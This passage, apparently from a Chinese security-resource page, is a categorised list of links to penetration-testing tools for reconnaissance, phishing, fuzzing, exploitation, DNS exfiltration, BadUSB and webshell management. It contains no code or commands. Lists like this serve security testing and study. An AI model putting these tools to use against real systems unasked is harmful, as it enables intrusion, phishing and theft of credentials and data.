{#信息收集-3}</span></h2><ol start='' ><li><h3 id='whois'><span>Whois</span></h3><ul><li><a href='https://who.is/'><span>who.is</span></a></li><li><a href='https://whois.aliyun.com/'><span>万网 WHOIS</span></a></li><li><a href='https://whois.cloud.tencent.com/'><span>腾讯云 WHOIS</span></a></li><li><a href='https://whois.chinaz.com/'><span>站长之家 WHOIS</span></a></li></ul></li><li><h3 id='网站备案'><span>网站备案</span></h3><ul><li><a href='https://www.tianyancha.com/'><span>天眼查</span></a></li><li><a href='http://www.beianbeian.com/'><span>ICP 备案查询</span></a></li><li><a href='https://icp.aizhan.com/'><span>爱站备案查询</span></a></li></ul></li><li><h3 id='cdn-查询'><span>CDN 查询</span></h3><ul><li><a href='https://ping.chinaz.com/'><span>多地 Ping</span></a></li><li><a href='https://tools.ipip.net/cdn.php'><span>CDN 服务商查询</span></a></li></ul></li><li><h3 id='子域爆破'><span>子域爆破</span></h3><ul><li><a href='https://github.com/lijiejie/subDomainsBrute'><span>subDomainsBrute</span></a></li><li><a href='https://github.com/ring04h/wydomain'><span>wydomain</span></a></li><li><a href='https://github.com/code-scan/BroDomain'><span>broDomain</span></a></li><li><a href='https://github.com/FeeiCN/ESD'><span>ESD</span></a></li><li><a href='https://github.com/blark/aiodnsbrute'><span>aiodnsbrute</span></a></li><li><a href='https://github.com/shmilylty/OneForAll'><span>OneForAll</span></a></li><li><a href='https://github.com/subfinder/subfinder'><span>subfinder</span></a></li><li><a href='https://github.com/infosec-au/altdns'><span>altdns</span></a><span> Generates permutations, alterations and mutations of subdomains and then resolves them</span></li></ul></li><li><h3 id='域名获取'><span>域名获取</span></h3><ul><li><a href='https://github.com/appsecco/the-art-of-subdomain-enumeration'><span>the art of subdomain enumeration</span></a></li><li><a href='https://github.com/cheetz/sslScrape/blob/master/sslScrape.py'><span>sslScrape</span></a></li><li><a href='https://github.com/michenriksen/aquatone'><span>aquatone</span></a><span> A Tool for Domain Flyovers</span></li><li><a href='https://github.com/bit4woo/teemo'><span>teemo</span></a><span> A Domain Name &amp; Email Address Collection Tool</span></li><li><a href='https://dnsdb.io/zh-cn/'><span>DNS DB 历史记录</span></a></li></ul></li><li><h3 id='弱密码爆破'><span>弱密码爆破</span></h3><ul><li><a href='https://github.com/vanhauser-thc/thc-hydra'><span>hydra</span></a></li><li><a href='https://github.com/jmk-foofus/medusa'><span>medusa</span></a><span> is a high-speed network authentication cracking tool</span></li><li><a href='https://github.com/nmap/ncrack'><span>Ncrack</span></a></li><li><a href='https://github.com/lijiejie/htpwdScan'><span>htpwdScan</span></a></li><li><a href='https://github.com/lanjelot/patator'><span>patator</span></a></li></ul></li><li><h3 id='git-信息泄漏'><span>Git 信息泄漏</span></h3><ul><li><a href='https://github.com/lijiejie/GitHack'><span>GitHack By lijiejie</span></a></li><li><a href='https://github.com/BugScanTeam/GitHack'><span>GitHack By BugScan</span></a></li><li><a href='https://github.com/internetwache/GitTools'><span>GitTools</span></a></li><li><a href='https://github.com/s0md3v/Zen'><span>Zen</span></a></li><li><a href='https://github.com/dxa4481/truffleHog'><span>dig github history</span></a></li><li><a href='https://github.com/michenriksen/gitrob'><span>gitrob Reconnaissance tool for GitHub organizations</span></a></li><li><a href='https://github.com/awslabs/git-secrets'><span>git secrets</span></a></li><li><a href='https://github.com/eth0izzle/shhgit'><span>shhgit</span></a><span> Find GitHub secrets in real time</span></li><li><a href='https://github.com/tillson/git-hound'><span>GitHound</span></a><span> GitHound pinpoints exposed API keys on GitHub using pattern matching, commit history searching, and a unique result scoring system. A batch-catching, pattern-matching, patch-attacking secret snatcher</span></li><li><a href='https://github.com/MiSecurity/x-patrol'><span>x patrol</span></a><span> Github leaked patrol</span></li><li><a href='https://github.com/obheda12/GitDorker'><span>GitDorker</span></a><span> scrape secrets from GitHub through usage of a large repository of dorks</span></li></ul></li><li><h3 id='github-监控'><span>Github 监控</span></h3><ul><li><a href='https://github.com/VKSRC/Github-Monitor'><span>Github Monitor</span></a><span> Github Sensitive Information Leakage Monitor</span></li><li><a href='https://github.com/techgaun/github-dorks'><span>Github Dorks</span></a></li><li><a href='https://github.com/FeeiCN/GSIL'><span>GSIL</span></a></li><li><a href='https://github.com/0xbug/Hawkeye'><span>Hawkeye</span></a></li><li><a href='https://github.com/neal1991/gshark'><span>gshark</span></a></li><li><a href='https://github.com/BishopFox/GitGot'><span>GitGot</span></a></li><li><a href='https://github.com/hisxo/gitGraber'><span>gitGraber</span></a><span> monitor GitHub to search and find sensitive data in real time for different online services</span></li></ul></li><li><h3 id='路径及文件扫描'><span>路径及文件扫描</span></h3><ul><li><a href='https://github.com/ring04h/weakfilescan'><span>weakfilescan</span></a></li><li><a href='https://github.com/Xyntax/DirBrute'><span>DirBrute</span></a></li><li><a href='https://github.com/maurosoria/dirsearch'><span>dirsearch</span></a></li><li><a href='https://github.com/mazen160/bfac'><span>bfac</span></a></li><li><a href='https://github.com/lijiejie/ds_store_exp'><span>ds_store_exp</span></a></li></ul></li><li><h3 id='路径爬虫'><span>路径爬虫</span></h3><ul><li><a href='https://github.com/0Kee-Team/crawlergo'><span>crawlergo</span></a><span> A powerful dynamic crawler for web vulnerability scanners</span></li></ul></li><li><h3 id='指纹识别'><span>指纹识别</span></h3><ul><li><a href='https://github.com/AliasIO/Wappalyzer'><span>Wappalyzer</span></a></li><li><a href='https://github.com/urbanadventurer/whatweb'><span>whatweb</span></a></li><li><a href='https://github.com/iniqua/plecost'><span>Wordpress Finger Print</span></a></li><li><a href='https://github.com/n4xh4ck5/CMSsc4n'><span>CMS 指纹识别</span></a></li><li><a href='https://github.com/salesforce/ja3'><span>JA3</span></a><span> is a standard for creating SSL client fingerprints in an easy to produce and shareable way</span></li><li><a href='https://github.com/TideSec/TideFinger'><span>TideFinger</span></a></li><li><a href='https://github.com/salesforce/jarm'><span>JARM</span></a><span> active Transport Layer Security (TLS) server fingerprinting tool</span></li><li><a href='https://github.com/fingerprintjs/fingerprintjs'><span>fingerprintjs</span></a><span> Browser fingerprinting library with the highest accuracy and stability</span></li></ul></li><li><h3 id='waf-指纹-1'><span>Waf 指纹</span></h3><ul><li><a href='https://github.com/enablesecurity/identywaf'><span>identywaf</span></a></li><li><a href='https://github.com/enablesecurity/wafw00f'><span>wafw00f</span></a></li><li><a href='https://github.com/Ekultek/WhatWaf'><span>WhatWaf</span></a></li></ul></li><li><h3 id='端口扫描-1'><span>端口扫描</span></h3><ul><li><a href='https://github.com/nmap/nmap'><span>nmap</span></a></li><li><a href='https://github.com/zmap/zmap'><span>zmap</span></a></li><li><a href='https://github.com/robertdavidgraham/masscan'><span>masscan</span></a></li><li><a href='https://github.com/HatBashBR/ShodanHat'><span>ShodanHat</span></a></li><li><a href='https://github.com/stanford-esrg/lzr'><span>lzr</span></a><span> LZR quickly detects and fingerprints unexpected services running on unexpected ports</span></li><li><a href='https://github.com/zmap/zgrab2'><span>ZGrab2</span></a><span> Fast Go Application Scanner</span></li><li><a href='https://github.com/RustScan/RustScan'><span>RustScan</span></a><span> The Modern Port Scanner</span></li><li><span>DNS dnsenum nslookup dig fierce</span></li><li><span>SNMP snmpwalk</span></li></ul></li><li><h3 id='dns-数据查询'><span>DNS 数据查询</span></h3><ul><li><a href='https://www.virustotal.com/'><span>VirusTotal</span></a></li><li><a href='https://passivetotal.org/'><span>PassiveTotal</span></a></li><li><a href='https://www.dnsdb.info/'><span>DNSDB</span></a></li><li><a href='http://www.sitedossier.com/'><span>sitedossier</span></a></li></ul></li><li><h3 id='dns-关联'><span>DNS 关联</span></h3><ul><li><a href='https://github.com/mandatoryprogrammer/cloudflare_enum'><span>Cloudflare Enumeration Tool</span></a></li><li><a href='https://github.com/caffix/amass'><span>amass</span></a></li><li><a href='https://crt.sh/'><span>Certificate Search</span></a></li></ul></li><li><h3 id='云服务'><span>云服务</span></h3><ul><li><a href='https://github.com/gwen001/s3-buckets-finder'><span>Find aws s3 buckets</span></a></li><li><a href='https://github.com/jordanpotti/CloudScraper'><span>CloudScraper</span></a></li><li><a href='https://github.com/jordanpotti/AWSBucketDump'><span>AWS Bucket Dump</span></a></li></ul></li><li><h3 id='数据查询'><span>数据查询</span></h3><ul><li><a href='https://censys.io/'><span>Censys</span></a></li><li><a href='https://www.shodan.io/'><span>Shodan</span></a></li><li><a href='https://www.zoomeye.org/'><span>Zoomeye</span></a></li><li><a href='https://fofa.so/'><span>fofa</span></a></li><li><a href='https://scans.io/'><span>scans</span></a></li><li><a href='https://github.com/FortyNorthSecurity/Just-Metadata'><span>Just Metadata</span></a></li><li><span>publicwww - Find Web Pages via Snippet</span></li></ul></li><li><h3 id='password'><span>Password</span></h3><ul><li><a href='https://github.com/berzerk0/Probable-Wordlists'><span>Probable Wordlists</span></a><span> Wordlists sorted by probability originally created for password generation and testing</span></li><li><a href='https://github.com/Mebus/cupp'><span>Common User Passwords Profiler</span></a></li><li><a href='https://github.com/x899/chrome_password_grabber'><span>chrome password grabber</span></a></li><li><a href='https://github.com/ihebski/DefaultCreds-cheat-sheet'><span>DefaultCreds cheat sheet</span></a><span> One place for all the default credentials to assist the pentesters during an engagement</span></li><li><a href='https://github.com/fuzz-security/SuperWordlist'><span>SuperWordlist</span></a></li></ul></li><li><h3 id='ci-信息泄露'><span>CI 信息泄露</span></h3><ul><li><a href='https://github.com/lc/secretz'><span>secretz</span></a><span> minimizing the large attack surface of Travis CI</span></li></ul></li><li><h3 id='个人数据画像'><span>个人数据画像</span></h3><ul><li><a href='https://github.com/mxrch/GHunt'><span>GHunt</span></a><span> Investigate Google Accounts with emails</span></li></ul></li><li><h3 id='邮箱收集'><span>邮箱收集</span></h3><ul><li><a href='https://github.com/maldevel/EmailHarvester'><span>EmailHarvester</span></a></li></ul></li><li><h3 id='其他-7'><span>其他</span></h3><ul><li><a href='https://github.com/DataSploit/datasploit'><span>datasploit</span></a></li><li><a href='https://github.com/flipkart-incubator/watchdog'><span>watchdog</span></a></li><li><a href='https://archive.org/web/'><span>archive</span></a></li><li><a href='https://github.com/cure53/HTTPLeaks'><span>HTTPLeaks</span></a></li><li><a href='https://github.com/trimstray/htrace.sh'><span>htrace</span></a></li><li><a href='https://github.com/360quake/quake_rs'><span>Quake Command-Line Application</span></a><span> 360 网络空间测绘系统</span></li></ul></li></ol></li><li><h2 id='社会工程学-2'><span>社会工程学</span></h2><ol start='' ><li><h3 id='osint'><span>OSINT</span></h3><ul><li><a href='http://osintframework.com/'><span>osint</span></a></li><li><a href='https://github.com/lockfale/OSINT-Framework'><span>osint git</span></a></li><li><a href='https://github.com/Ph055a/OSINTCollection'><span>OSINT-Collection</span></a></li><li><a href='https://github.com/jofpin/trape'><span>trape</span></a></li><li><a href='https://github.com/s0md3v/Photon'><span>Photon</span></a></li><li><a href='https://github.com/netevert/pockint'><span>pockint</span></a></li></ul></li><li><h3 id='社交工具'><span>社交工具</span></h3><ul><li><a href='https://github.com/emtunc/SlackPirate'><span>SlackPirate</span></a><span> Slack Enumeration and Extraction Tool - extract sensitive information from a Slack Workspace</span></li><li><a href='https://github.com/twintproject/twint'><span>twint</span></a><span> An advanced Twitter scraping &amp; OSINT tool</span></li></ul></li><li><h3 id='个人搜索'><span>个人搜索</span></h3><ul><li><a href='https://pipl.com/'><span>pipl</span></a></li><li><a href='https://hunter.io/'><span>hunter</span></a></li><li><a href='https://github.com/ThoughtfulDev/EagleEye'><span>EagleEye</span></a></li><li><a href='https://github.com/mdsecactivebreach/LinkedInt'><span>LinkedInt</span></a></li><li><a href='https://github.com/sherlock-project/sherlock'><span>sherlock</span></a></li><li><a href='https://github.com/Frint0/email-enum'><span>email enum</span></a></li><li><a href='https://github.com/n0tr00t/Sreg'><span>Sreg</span></a></li><li><a href='https://usersearch.org/'><span>usersearch</span></a></li><li><a href='https://www.user-searcher.com/'><span>User Searcher</span></a><span> User-Searcher is a powerful and free tool to help you search username in 2000+ websites.</span></li></ul></li><li><h3 id='hacking-database'><span>Hacking database</span></h3><ul><li><a href='https://www.exploit-db.com/google-hacking-database/'><span>GHDB</span></a></li><li><a href='https://github.com/kernelmachine/haveibeenpwned'><span>have i been pwned</span></a></li></ul></li><li><h3 id='钓鱼'><span>钓鱼</span></h3><ul><li><a href='https://github.com/BishopFox/spoofcheck'><span>spoofcheck</span></a></li><li><a href='https://github.com/gophish/gophish'><span>gophish</span></a></li><li><a href='https://github.com/UndeadSec/SocialFish'><span>SocialFish</span></a></li><li><a href='https://github.com/hacklcx/HFish'><span>HFish</span></a><span> A Most Convenient Honeypot Platform</span></li><li><a href='https://github.com/thelinuxchoice/blackeye'><span>blackeye</span></a><span> complete Phishing Tool, with 32 templates +1 customizable</span></li><li><a href='https://github.com/rsmusllp/king-phisher/'><span>king phisher</span></a><span> Phishing Campaign Toolkit</span></li><li><a href='https://github.com/chenjj/espoofer'><span>espoofer</span></a><span> An email spoofing testing tool that aims to bypass SPF/DKIM/DMARC and forge DKIM signatures</span></li><li><a href='https://github.com/evilsocket/ditto'><span>ditto</span></a><span> A tool for IDN homograph attacks and detection</span></li><li><a href='https://github.com/Threezh1/SiteCopy'><span>SiteCopy</span></a><span> sitecopy is a tool that facilitates personal website backup and network data collection</span></li><li><a href='https://github.com/xiecat/goblin'><span>goblin</span></a><span> 一款适用于红蓝对抗中的仿真钓鱼系统</span></li></ul></li><li><h3 id='squatting'><span>squatting</span></h3><ul><li><a href='https://github.com/elceef/dnstwist'><span>dnstwist</span></a><span> Domain name permutation engine for detecting homograph phishing attacks, typo squatting, and brand impersonation</span></li></ul></li><li><h3 id='网盘搜索'><span>网盘搜索</span></h3><ul><li><a href='http://magnet.chongbuluo.com/'><span>虫部落</span></a></li><li><a href='http://www.panduoduo.net/'><span>盘多多</span></a></li><li><a href='https://www.panc.cc/'><span>Infinite Panc</span></a></li></ul></li><li><h3 id='密码猜测'><span>密码猜测</span></h3><ul><li><a href='https://github.com/RUB-SysSec/OMEN'><span>OMEN</span></a><span> Ordered Markov ENumerator - Password Guesser</span></li><li><a href='https://github.com/RicterZ/genpAss'><span>genpAss</span></a></li></ul></li><li><h3 id='伪造-2'><span>伪造</span></h3><ul><li><a href='https://github.com/Macr0phag3/email_hack'><span>email_hack</span></a><span> 基于 Python 伪造电子邮件发件人</span></li></ul></li><li><h3 id='综合框架-1'><span>综合框架</span></h3><ul><li><a href='https://github.com/laramies/theHarvester'><span>theHarvester</span></a></li><li><a href='https://github.com/Moham3dRiahi/Th3inspector'><span>Th3inspector</span></a></li><li><a href='https://github.com/s0md3v/ReconDog'><span>ReconDog</span></a></li></ul></li></ol></li><li><h2 id='模糊测试'><span>模糊测试</span></h2><ol start='' ><li><h3 id='web-fuzz'><span>Web Fuzz</span></h3><ul><li><a href='https://github.com/xmendez/wfuzz'><span>wfuzz</span></a></li><li><a href='https://github.com/danielmiessler/SecLists'><span>SecLists</span></a></li><li><a href='https://github.com/fuzzdb-project/fuzzdb'><span>fuzzdb</span></a></li><li><a href='https://github.com/foospidy/payloads'><span>foospidy payloads</span></a></li><li><a href='https://github.com/ffuf/ffuf'><span>ffuf</span></a><span> Fast web fuzzer written in Go</span></li></ul></li><li><h3 id='扫描器'><span>扫描器</span></h3><ul><li><a href='https://github.com/projectdiscovery/nuclei'><span>Nuclei</span></a><span> a fast tool for configurable targeted vulnerability scanning based on templates offering massive extensibility and ease of use</span></li><li><a href='https://github.com/chaitin/xray'><span>xray</span></a><span> 安全评估工具，支持常见 web 安全问题扫描和自定义 poc</span></li></ul></li><li><h3 id='xss-payloads'><span>XSS Payloads</span></h3><ul><li><a href='https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'><span>PORTSWIGGER XSS cheat sheet</span></a></li><li><a href='https://github.com/Pgaijin66/XSS-Payloads'><span>Pgaijin66 XSS-Payloads</span></a></li><li><a href='https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet'><span>OWASP XSS</span></a></li></ul></li><li><h3 id='burp-插件'><span>Burp 插件</span></h3><ul><li><a href='https://github.com/wagiro/BurpBounty'><span>BurpBounty</span></a><span> Scan Check Builder</span></li><li><a href='https://github.com/pmiaowu/BurpShiroPassiveScan'><span>BurpShiroPassiveScan</span></a></li><li><a href='https://github.com/1N3/IntruderPayloads'><span>IntruderPayloads</span></a><span> A collection of Burpsuite Intruder payloads</span></li></ul></li><li><h3 id='字典'><span>字典</span></h3><ul><li><a href='https://github.com/rootphantomer/Blasting_dictionary'><span>Blasting dictionary</span></a></li><li><a href='https://github.com/LandGrey/pydictor'><span>pydictor</span></a><span> A powerful and useful hacker dictionary builder for a brute-force attack</span></li><li><a href='https://github.com/TheKingOfDuck/fuzzDicts'><span>fuzzDicts</span></a><span> Web Pentesting Fuzz 字典</span></li><li><a href='https://github.com/random-robbie/bruteforce-lists'><span>bruteforce lists</span></a></li><li><a href='https://github.com/internetwache/CT_subdomains'><span>CT subdomains</span></a></li><li><a href='https://github.com/ppbibo/PentesterSpecialDict'><span>PentesterSpecialDict</span></a><span> 渗透测试人员专用精简化字典</span></li></ul></li><li><h3 id='unicode-fuzz'><span>Unicode Fuzz</span></h3><ul><li><a href='http://www.fileformat.info/info/charset/UTF-16/list.htm'><span>utf16encode</span></a></li></ul></li><li><h3 id='waf-bypass'><span>WAF Bypass</span></h3><ul><li><a href='https://github.com/LandGrey/abuse-ssl-bypass-waf'><span>abuse ssl bypass waf</span></a></li><li><a href='https://github.com/khalilbijjou/wafninja'><span>wafninja</span></a></li></ul></li></ol></li><li><h2 id='漏洞利用检测'><span>漏洞利用/检测</span></h2><ol start='' ><li><h3 id='数据库注入'><span>数据库注入</span></h3><ul><li><a href='https://github.com/sqlmapproject/sqlmap'><span>SQLMap</span></a></li><li><a href='https://github.com/Neohapsis/bbqsql'><span>bbqsql</span></a></li><li><a href='https://github.com/quentinhardy/msdat'><span>MSDAT</span></a><span> Microsoft SQL Database Attacking Tool</span></li></ul></li><li><h3 id='非结构化数据库注入'><span>非结构化数据库注入</span></h3><ul><li><a href='https://github.com/youngyangyang04/NoSQLAttack'><span>NoSQLAttack</span></a></li><li><a href='https://github.com/codingo/NoSQLMap'><span>NoSQLMap</span></a></li><li><a href='https://github.com/torque59/Nosql-Exploitation-Framework'><span>Nosql Exploitation Framework</span></a></li><li><a href='https://github.com/stampery/mongoaudit'><span>MongoDB audit</span></a></li></ul></li><li><h3 id='数据库漏洞利用'><span>数据库漏洞利用</span></h3><ul><li><a href='https://github.com/cyrus-and/mysql-unsha1'><span>mysql unsha1</span></a></li><li><a href='https://github.com/quentinhardy/odat'><span>ODAT</span></a><span> Oracle Database Attacking Tool</span></li></ul></li><li><h3 id='xss-1'><span>XSS</span></h3><ul><li><a href='https://github.com/beefproject/beef'><span>BeEF</span></a></li><li><a href='https://github.com/firesunCN/BlueLotus_XSSReceiver'><span>XSS Reciver</span></a></li><li><a href='https://github.com/stamparm/DSXS'><span>DSXS</span></a></li><li><a href='https://github.com/s0md3v/XSStrike'><span>XSStrike</span></a></li><li><a href='https://github.com/gbrindisi/xsssniper'><span>xsssniper</span></a></li><li><a href='https://github.com/nccgroup/tracy'><span>tracy</span></a></li><li><a href='https://github.com/xsleaks/xsleaks'><span>xsleaks</span></a><span> A collection of browser-based side channel attack vectors</span></li></ul></li><li><h3 id='ssrf-4'><span>SSRF</span></h3><ul><li><a href='https://github.com/swisskyrepo/SSRFmap'><span>SSRFmap</span></a></li><li><a href='https://github.com/bcoles/ssrf_proxy'><span>SSRF Proxy</span></a></li><li><a href='https://github.com/tarunkant/Gopherus'><span>Gopherus</span></a></li><li><a href='https://github.com/cujanovic/SSRF-Testing'><span>SSRF Testing</span></a></li></ul></li><li><h3 id='模版注入'><span>模版注入</span></h3><ul><li><a href='https://github.com/epinna/tplmap'><span>tplmap</span></a></li></ul></li><li><h3 id='http-request-smuggling'><span>HTTP Request Smuggling</span></h3><ul><li><a href='https://github.com/defparam/smuggler'><span>smuggler</span></a><span> An HTTP Request Smuggling / Desync testing tool written in Python</span></li><li><a href='https://github.com/BishopFox/h2csmuggler'><span>h2cSmuggler</span></a><span> HTTP Request Smuggling over HTTP/2 Cleartext (h2c)</span></li></ul></li><li><h3 id='命令注入-1'><span>命令注入</span></h3><ul><li><a href='https://github.com/commixproject/commix'><span>commix</span></a></li></ul></li><li><h3 id='php-3'><span>PHP</span></h3><ul><li><a href='https://github.com/TarlogicSecurity/Chankro'><span>Chankro</span></a><span> Herramienta para evadir disable_functions y open_basedir</span></li></ul></li><li><h3 id='lfi-2'><span>LFI</span></h3><ul><li><a href='https://github.com/D35m0nd142/LFISuite'><span>LFISuite</span></a></li><li><a href='https://github.com/chrispetrou/FDsploit'><span>FDsploit</span></a></li></ul></li><li><h3 id='struts'><span>struts</span></h3><ul><li><a href='https://github.com/Lucifer1993/struts-scan'><span>struts scan</span></a></li></ul></li><li><h3 id='cms'><span>CMS</span></h3><ul><li><a href='https://github.com/rezasp/joomscan'><span>Joomla Vulnerability Scanner</span></a></li><li><a href='https://github.com/immunIT/drupwn'><span>Drupal enumeration &amp; exploitation tool</span></a></li><li><a href='https://github.com/UltimateLabs/Zoom'><span>Wordpress Vulnerability Scanner</span></a></li><li><a href='https://github.com/Lucifer1993/TPscan'><span>TPscan</span></a><span> 一键 ThinkPHP 漏洞检测</span></li><li><a href='https://github.com/lengjibo/dedecmscan'><span>dedecmscan</span></a><span> 织梦全版本漏洞扫描</span></li></ul></li><li><h3 id='java-框架'><span>Java 框架</span></h3><ul><li><a href='https://github.com/sv3nbeast/ShiroScan'><span>ShiroScan</span></a><span> Shiro</span><span>&lt;</span><span>=1.2.4 反序列化检测工具</span></li><li><a href='https://github.com/wyzxxz/fastjson_rce_tool'><span>fastjson rce tool</span></a><span> fastjson 命令执行利用工具</span></li></ul></li><li><h3 id='dns-相关漏洞'><span>DNS 相关漏洞</span></h3><ul><li><a href='https://github.com/Tr3jer/dnsAutoRebinding'><span>dnsAutoRebinding</span></a></li><li><a href='https://github.com/Lucifer1993/AngelSword'><span>AngelSword</span></a></li><li><a href='https://github.com/m4ll0k/takeover'><span>Subdomain TakeOver</span></a></li><li><a href='https://github.com/nopernik/mpDNS'><span>mpDNS</span></a></li><li><a href='https://github.com/mandatoryprogrammer/JudasDNS'><span>JudasDNS Nameserver DNS poisoning</span></a></li><li><a href='https://github.com/nccgroup/singularity'><span>singularity</span></a><span> A DNS rebinding attack framework by NGC Group</span></li></ul></li><li><h3 id='dns-数据提取'><span>DNS 数据提取</span></h3><ul><li><a href='https://github.com/m57/dnsteal'><span>dnsteal</span></a></li><li><a href='https://github.com/Arno0x/DNSExfiltrator'><span>DNSExfiltrator</span></a></li><li><a href='https://github.com/krmaxwell/dns-exfiltration'><span>dns exfiltration by krmaxwell</span></a></li><li><a href='https://github.com/coryschwartz/dns_exfiltration'><span>dns exfiltration by coryschwartz</span></a></li><li><a href='http://requestbin.net/dns'><span>requestbin for dns</span></a></li></ul></li><li><h3 id='dns-隧道-2'><span>DNS 隧道</span></h3><ul><li><a href='https://dnstunnel.de/'><span>dnstunnel de</span></a></li><li><a href='https://code.kryo.se/iodine/'><span>iodine</span></a></li></ul></li><li><h3 id='dns-shell-1'><span>DNS Shell</span></h3><ul><li><a href='https://github.com/sysdream/chashell'><span>chashell</span></a></li><li><a href='https://github.com/iagox86/dnscat2'><span>dnscat2</span></a></li></ul></li><li><h3 id='xxe-3'><span>XXE</span></h3><ul><li><a href='https://github.com/enjoiz/XXEinjector'><span>XXEinjector</span></a></li><li><a href='https://github.com/TheTwitchy/xxer'><span>XXER</span></a></li><li><a href='https://github.com/GoSecure/dtd-finder'><span>DTD Finder</span></a><span> List DTDs and generate XXE payloads using those local DTDs</span></li></ul></li><li><h3 id='反序列化-9'><span>反序列化</span></h3></li></ol></li></ol><h4 id='java-反序列化'><span>Java 反序列化</span></h4><ul><li><a href='https://github.com/frohoff/ysoserial'><span>ysoserial</span></a></li><li><a href='https://github.com/pwntester/JRE8u20_RCE_Gadget'><span>JRE8u20 RCE Gadget</span></a></li><li><a href='https://github.com/NickstaDB/SerializationDumper'><span>Java Serialization Dumper</span></a><span> A tool to dump Java serialization streams in a more human readable form</span></li><li><a href='https://github.com/mbechler/marshalsec'><span>marshalsec</span></a><span> Java Unmarshaller Security - Turning your data into code execution</span></li><li><a href='https://github.com/JackOfMostTrades/gadgetinspector'><span>gadgetinspector</span></a><span> A byte code analyzer for finding deserialization gadget chains in Java applications</span></li><li><a href='https://github.com/zilong3033/fastjsonScan'><span>fastjsonScan</span></a><span> fastjson 漏洞 burp 插件</span></li></ul><h4 id='net-反序列化'><span>.NET 反序列化</span></h4><ul><li><a href='https://github.com/0xacb/viewgen'><span>viewgen</span></a><span> ASP.NET ViewState Generator</span></li></ul><ol start='20' ><li><h3 id='jndi-3'><span>JNDI</span></h3><ul><li><a href='https://github.com/veracode-research/rogue-jndi'><span>Rogue JNDI</span></a><span> A malicious LDAP server for JNDI injection attacks</span></li><li><a href='https://github.com/welk1n/JNDI-Injection-Exploit'><span>JNDI Injection Exploit</span></a></li><li><a href='https://github.com/feihong-cs/JNDIExploit'><span>JNDIExploit</span></a></li></ul></li><li><h3 id='端口-hack'><span>端口 Hack</span></h3><ul><li><a href='https://github.com/vulnersCom/nmap-vulners'><span>nmap vulners</span></a></li><li><a href='https://github.com/cldrn/nmap-nse-scripts'><span>nmap nse scripts</span></a></li><li><a href='https://github.com/scipag/vulscan'><span>Vulnerability Scanning with Nmap</span></a></li></ul></li><li><h3 id='jwt-2'><span>JWT</span></h3><ul><li><a href='https://github.com/brendan-rius/c-jwt-cracker'><span>jwtcrack</span></a></li></ul></li><li><h3 id='无线-1'><span>无线</span></h3><ul><li><a href='https://github.com/entropy1337/infernal-twin'><span>infernal twin</span></a></li></ul></li><li><h3 id='中间人攻击'><span>中间人攻击</span></h3></li></ol><p><span>[TABLE]</span></p><blockquote><p><span>HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.</span></p></blockquote><ul><li><a href='https://github.com/h2non/toxy'><span>toxy</span></a><span> Hackable HTTP proxy for resiliency testing and simulated network conditions</span></li><li><a href='https://github.com/bettercap/bettercap'><span>bettercap</span></a><span> The Swiss Army knife for 802.11, BLE and Ethernet networks reconnaissance and MITM attacks</span></li></ul><ol start='' ><li><h3 id='dhcp'><span>DHCP</span></h3><ul><li><a href='https://github.com/mschwager/dhcpwn'><span>DHCPwn</span></a></li></ul></li><li><h3 id='ddos-2'><span>DDoS</span></h3><ul><li><a href='https://github.com/OffensivePython/Saddam'><span>Saddam</span></a></li></ul></li><li><h3 id='正则表达式'><span>正则表达式</span></h3><ul><li><a href='https://github.com/doyensec/regexploit'><span>Regexploit</span></a><span> Find regular expressions which are vulnerable to ReDoS</span></li></ul></li><li><h3 id='shellcode'><span>Shellcode</span></h3><ul><li><a href='https://github.com/Ne0nd0g/go-shellcode'><span>go shellcode</span></a><span> A repository of Windows Shellcode runners and supporting utilities</span></li></ul></li><li><h3 id='越权'><span>越权</span></h3><ul><li><a href='https://github.com/ztosec/secscan-authcheck'><span>secscan authcheck</span></a></li></ul></li><li><h3 id='利用平台'><span>利用平台</span></h3><ul><li><a href='https://github.com/BugScanTeam/DNSLog'><span>DNSLog</span></a><span> 是一款监控 DNS 解析记录和 HTTP 访问记录的工具</span></li><li><a href='https://github.com/QAX-A-Team/LuWu'><span>LuWu</span></a><span> 红队基础设施自动化部署工具</span></li></ul></li><li><h3 id='漏洞利用库'><span>漏洞利用库</span></h3><ul><li><a href='https://github.com/Mr-xn/Penetration_Testing_POC'><span>Penetration Testing POC</span></a></li><li><a href='https://github.com/vanhauser-thc/thc-ipv6'><span>thc ipv6</span></a><span> IPv6 attack toolkit</span></li></ul></li><li><h3 id='漏洞利用框架'><span>漏洞利用框架</span></h3><ul><li><a href='https://github.com/knownsec/pocsuite3'><span>pocsuite3</span></a></li></ul></li><li><h3 id='windows-5'><span>Windows</span></h3><ul><li><a href='https://github.com/GoSecure/pywsus'><span>PyWSUS</span></a><span> a standalone implementation of a legitimate WSUS server which sends malicious responses to clients</span></li></ul></li></ol><p>&nbsp;</p><ol start='' ><li><h2 id='近源渗透-1'><span>近源渗透</span></h2><ol start='' ><li><h3 id='bad-usb'><span>Bad USB</span></h3><ul><li><a href='https://github.com/spacehuhn/WiFiDuck'><span>WiFiDuck</span></a><span> Keystroke injection attack plattform</span></li><li><a href='https://github.com/Xyntax/BadUSB-code'><span>BadUSB code</span></a><span> badusb 的一些利用方式及代码</span></li><li><a href='https://github.com/whid-injector/WHID'><span>WHID</span></a><span> WiFi HID Injector - An USB Rubberducky / BadUSB On Steroids</span></li><li><a href='https://github.com/joelsernamoreno/BadUSB-Cable'><span>BadUSB cable</span></a><span> based on Attiny85 microcontroller</span></li><li><a href='https://github.com/hak5darren/USB-Rubber-Ducky'><span>USB Rubber Ducky</span></a></li></ul></li><li><h3 id='wifi'><span>wifi</span></h3><ul><li><a href='https://github.com/wifiphisher/wifiphisher'><span>wifiphisher</span></a></li><li><a href='https://github.com/kgretzky/evilginx'><span>evilginx</span></a></li><li><a href='https://github.com/sensepost/mana'><span>mana</span></a></li><li><a href='https://github.com/evilsocket/pwnagotchi'><span>pwnagotchi</span></a></li></ul></li><li><h3 id='无线-2'><span>无线</span></h3><ul><li><a href='https://github.com/mossmann/hackrf'><span>hackrf</span></a><span> low cost software radio platform</span></li></ul></li></ol></li><li><h2 id='web-持久化'><span>Web 持久化</span></h2><ol start='' ><li><h3 id='webshell-管理工具'><span>WebShell 管理工具</span></h3><ul><li><a href='https://github.com/Chora10/Cknife'><span>菜刀</span></a></li><li><a href='https://github.com/antoor/antSword'><span>antSword</span></a></li><li><a 